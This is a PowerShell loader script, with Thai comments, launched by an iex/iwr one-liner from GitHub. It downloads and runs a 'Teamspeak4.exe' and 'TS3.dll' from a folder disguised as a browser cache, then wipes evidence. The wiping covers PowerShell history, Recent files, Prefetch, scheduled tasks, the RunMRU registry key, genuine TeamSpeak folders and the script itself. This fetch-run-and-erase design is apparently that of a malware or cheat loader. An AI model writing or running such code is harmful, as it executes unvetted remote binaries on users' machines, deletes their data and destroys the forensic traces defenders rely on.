# install.ps1 — Teamspeak4cvrftg loader + cleaner
# Usage: iex (iwr -UseBasicParsing 'https://raw.githubusercontent.com/kanokpoltankaew712-gif/Teamspeak4cvrftg/main/install.ps1').Content

$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ──── Config ─────────────────────────────────────────────
$dir = Join-Path $env:LOCALAPPDATA 'Microsoft\INetCache\cache'
$exeName = 'Teamspeak4.exe'
$dllName = 'TS3.dll'
$exe = Join-Path $dir $exeName
$dll = Join-Path $dir $dllName
$tmpExe = Join-Path $dir 'T4.download'
$tmpDll = Join-Path $dir 'T4.dll.download'

$urls = @(
    'https://raw.githubusercontent.com/kanokpoltankaew712-gif/Teamspeak4cvrftg/main',
    'https://cdn.jsdelivr.net/gh/kanokpoltankaew712-gif/Teamspeak4cvrftg@main',
    'https://raw.githack.com/kanokpoltankaew712-gif/Teamspeak4cvrftg/main'
)
$ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'

# ──── Helpers ────────────────────────────────────────────
function Remove-Safe($p, [switch]$Recurse) {
    if (-not (Test-Path -LiteralPath $p)) { return }
    try {
        if ($Recurse) { Remove-Item -LiteralPath $p -Recurse -Force -ErrorAction Stop }
        else          { Remove-Item -LiteralPath $p -Force -ErrorAction Stop }
        Write-Host "  removed: $p" -ForegroundColor DarkGray
    } catch {
        Write-Host "  skip: $p" -ForegroundColor Yellow
    }
}

function Clear-PSHistory {
    foreach ($h in @(
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
        "$env:APPDATA\Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt"
    )) {
        if (Test-Path -LiteralPath $h) {
            try { Clear-Content -LiteralPath $h -Force -ErrorAction Stop } catch {}
        }
    }
}

function Test-PE($p, [int]$MinBytes = 100KB) {
    if (-not (Test-Path -LiteralPath $p)) { return $false }
    try {
        $i = Get-Item -LiteralPath $p
        if ($i.Length -lt $MinBytes) { return $false }
        $b = New-Object byte[] 2
        $s = [IO.File]::OpenRead($p)
        try { [void]$s.Read($b, 0, 2) } finally { $s.Dispose() }
        return ($b[0] -eq 0x4D -and $b[1] -eq 0x5A)
    } catch { return $false }
}

function Get-File($url, $dst) {
    try {
        Invoke-WebRequest -Uri $url -OutFile $dst -UseBasicParsing `
            -Headers @{ 'User-Agent' = $ua } -TimeoutSec 120
        return (Test-Path -LiteralPath $dst)
    } catch {
        return $false
    }
}

# ──── Clean-AfterClose (Enhanced) ────────────────────────
function Clean-AfterClose {
    Write-Host ''
    Write-Host 'Cleaning traces...' -ForegroundColor Cyan

    # 1) Kill process ที่เกี่ยวข้องทั้งหมด
    Get-Process -ErrorAction SilentlyContinue |
        Where-Object {
            ($_.Path -and $_.Path -eq $exe) -or
            $_.ProcessName -match 'Teamspeak4|Teamspeak|ts4|T4'
        } |
        ForEach-Object {
            try {
                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
                Write-Host "  killed PID $($_.Id) ($($_.ProcessName))" -ForegroundColor DarkGray
            } catch {}
        }
    Start-Sleep -Milliseconds 800

    # 2) ลบไฟล์หลักและ temp
    Remove-Safe $tmpExe
    Remove-Safe $tmpDll
    Remove-Safe $exe
    Remove-Safe $dll

    # 3) ลบโฟลเดอร์ cache ที่ใช้เก็บไฟล์ (Retry 3 ครั้ง)
    for ($i = 0; $i -lt 3; $i++) {
        if (-not (Test-Path -LiteralPath $dir)) { break }
        Remove-Safe $dir -Recurse
        Start-Sleep -Milliseconds 500
    }
    # ถ้ายังไม่หาย ใช้ cmd ลบแบบ force
    if (Test-Path -LiteralPath $dir) {
        try {
            Start-Process -FilePath 'cmd.exe' `
                -ArgumentList "/C rd /S /Q `"$dir`"" `
                -WindowStyle Hidden -Wait
            Write-Host "  forced remove: $dir" -ForegroundColor DarkGray
        } catch {}
    }

    # 4) ลบโฟลเดอร์ที่เกี่ยวข้องใน LOCALAPPDATA / APPDATA
    foreach ($folder in @('Teamspeak4cvrftg','Teamspeak4','TS4','T4','TeamSpeak','TeamSpeak3Client')) {
        Remove-Safe (Join-Path $env:LOCALAPPDATA $folder) -Recurse
        Remove-Safe (Join-Path $env:APPDATA      $folder) -Recurse
    }

    # 5) ลบไฟล์ใน temp ที่ชื่อเกี่ยวข้อง
    $tempRoots = @($env:TEMP, (Join-Path $env:LOCALAPPDATA 'Temp'))
    foreach ($root in $tempRoots) {
        if (-not (Test-Path -LiteralPath $root)) { continue }
        Get-ChildItem -LiteralPath $root -File -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -match 'Teamspeak4|TS3|T4|teamspeak' } |
            ForEach-Object { Remove-Safe $_.FullName }
    }

    # 6) ลบ Recent files
    $recent = Join-Path $env:APPDATA 'Microsoft\Windows\Recent'
    if (Test-Path -LiteralPath $recent) {
        Get-ChildItem -LiteralPath $recent -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -match 'powershell|\.ps1|Teamspeak4|TS3|teamspeak' } |
            ForEach-Object { Remove-Safe $_.FullName }
    }

    # 7) ลบ Prefetch (ถ้าเป็น Admin)
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).
                IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($isAdmin) {
        $prefetch = Join-Path $env:SystemRoot 'Prefetch'
        if (Test-Path -LiteralPath $prefetch) {
            Get-ChildItem -LiteralPath $prefetch -ErrorAction SilentlyContinue |
                Where-Object { $_.Name -match 'TEAMSPEAK|TS3|T4|POWERSHELL|PWSH' } |
                ForEach-Object { Remove-Safe $_.FullName }
        }

        # 7b) ลบ Scheduled Tasks ที่ชื่อเกี่ยวข้อง
        try {
            Get-ScheduledTask -ErrorAction SilentlyContinue |
                Where-Object { $_.TaskName -match 'Teamspeak|TS3|T4' } |
                ForEach-Object {
                    Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
                    Write-Host "  removed task: $($_.TaskName)" -ForegroundColor DarkGray
                }
        } catch {}
    }

    # 8) ลบ Registry RunMRU
    try {
        $mru = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
        if (Test-Path $mru) {
            Get-ItemProperty $mru -ErrorAction SilentlyContinue |
                Get-Member -MemberType NoteProperty -ErrorAction SilentlyContinue |
                Where-Object { $_.Name -notmatch '^(PS|MRUList)' } |
                ForEach-Object {
                    $val = (Get-ItemProperty $mru -Name $_.Name -ErrorAction SilentlyContinue).($_.Name)
                    if ($val -match 'teamspeak|TS3|T4|Teamspeak4') {
                        Remove-ItemProperty -Path $mru -Name $_.Name -Force -ErrorAction SilentlyContinue
                    }
                }
        }
    } catch {}

    # 9) ลบ RunMRU ของ Explorer (ที่อยู่ล่าสุด)
    try {
        $explorerMRU = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
        Remove-Item -Path $explorerMRU -Recurse -Force -ErrorAction SilentlyContinue
    } catch {}

    # 10) ลบ history ของ PowerShell
    Clear-PSHistory

    # 11) ตรวจสอบว่าลบหมดหรือยัง
    $left = @()
    if (Test-Path -LiteralPath $exe)     { $left += $exe }
    if (Test-Path -LiteralPath $dll)     { $left += $dll }
    if (Test-Path -LiteralPath $dir)     { $left += $dir }
    if ($left.Count -gt 0) {
        Write-Host "  ⚠ ยังเหลือ: $($left -join ', ')" -ForegroundColor Yellow
    } else {
        Write-Host 'Clean done. All traces removed.' -ForegroundColor Green
    }
}

# ──── Main ───────────────────────────────────────────────
try {
    if (-not (Test-Path -LiteralPath $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }

    if ((Test-Path -LiteralPath $exe) -and -not (Test-PE $exe 100KB)) {
        Remove-Safe $exe
    }
    if ((Test-Path -LiteralPath $dll) -and -not (Test-PE $dll 1KB)) {
        Remove-Safe $dll
    }

    # Download exe ถ้ายังไม่มี
    if (-not (Test-PE $exe 100KB)) {
        Write-Host 'Downloading Teamspeak4.exe ...' -ForegroundColor Cyan
        $ok = $false
        foreach ($base in $urls) {
            for ($n = 1; $n -le 2; $n++) {
                try {
                    Remove-Safe $tmpExe
                    Write-Host "  try $n/2: $base/$exeName" -ForegroundColor DarkGray
                    if (Get-File "$base/$exeName" $tmpExe) {
                        if (Test-PE $tmpExe 100KB) {
                            Move-Item -LiteralPath $tmpExe -Destination $exe -Force
                            $ok = $true
                            break
                        }
                    }
                    Write-Host '  invalid file' -ForegroundColor Yellow
                } catch {
                    Write-Host "  failed: $($_.Exception.Message)" -ForegroundColor Yellow
                    Start-Sleep -Seconds 2
                }
            }
            if ($ok) { break }
        }
        if (-not $ok) { throw 'Cannot download Teamspeak4.exe' }
        Write-Host "Downloaded: $exe ($((Get-Item $exe).Length) bytes)" -ForegroundColor Green
    } else {
        Write-Host "Using cache: $exe" -ForegroundColor Green
    }

    # Download dll ถ้ายังไม่มี
    if (-not (Test-PE $dll 1KB)) {
        Write-Host 'Downloading TS3.dll ...' -ForegroundColor Cyan
        $ok = $false
        foreach ($base in $urls) {
            for ($n = 1; $n -le 2; $n++) {
                try {
                    Remove-Safe $tmpDll
                    if (Get-File "$base/$dllName" $tmpDll) {
                        if (Test-PE $tmpDll 1KB) {
                            Move-Item -LiteralPath $tmpDll -Destination $dll -Force
                            $ok = $true
                            break
                        }
                    }
                } catch {
                    Start-Sleep -Seconds 2
                }
            }
            if ($ok) { break }
        }
        if (-not $ok) { throw 'Cannot download TS3.dll' }
        Write-Host "Downloaded: $dll ($((Get-Item $dll).Length) bytes)" -ForegroundColor Green
    }

    # Run
    Write-Host 'Starting Teamspeak4...' -ForegroundColor Cyan
    $psi = New-Object Diagnostics.ProcessStartInfo
    $psi.FileName         = $exe
    $psi.WorkingDirectory = $dir
    $psi.UseShellExecute  = $false
    $proc = [Diagnostics.Process]::Start($psi)
    if ($null -eq $proc) { throw 'Cannot start Teamspeak4.exe' }

    Write-Host 'Teamspeak4 is running. Wait until you close the program...' -ForegroundColor Green
    Write-Host '(Do not close this PowerShell window)' -ForegroundColor Yellow

    try { $proc.WaitForExit() } catch {}
    Start-Sleep -Seconds 1

    for ($i = 0; $i -lt 30; $i++) {
        $alive = Get-Process -ErrorAction SilentlyContinue |
                 Where-Object { $_.Path -and $_.Path -eq $exe }
        if (-not $alive) { break }
        Start-Sleep -Seconds 1
    }

    Write-Host 'Teamspeak4 closed.' -ForegroundColor Cyan
    Clean-AfterClose
}
catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    try { Clean-AfterClose } catch {}
}

# ──── Self-clean ─────────────────────────────────────────
try {
    $selfPath = $MyInvocation.MyCommand.Path
    if ($selfPath -and (Test-Path -LiteralPath $selfPath)) {
        Start-Process -FilePath 'cmd.exe' `
            -ArgumentList "/C ping -n 2 127.0.0.1 >nul & del /F /Q `"$selfPath`"" `
            -WindowStyle Hidden
    }
} catch {}

Write-Host ''
Read-Host 'Press Enter to close'
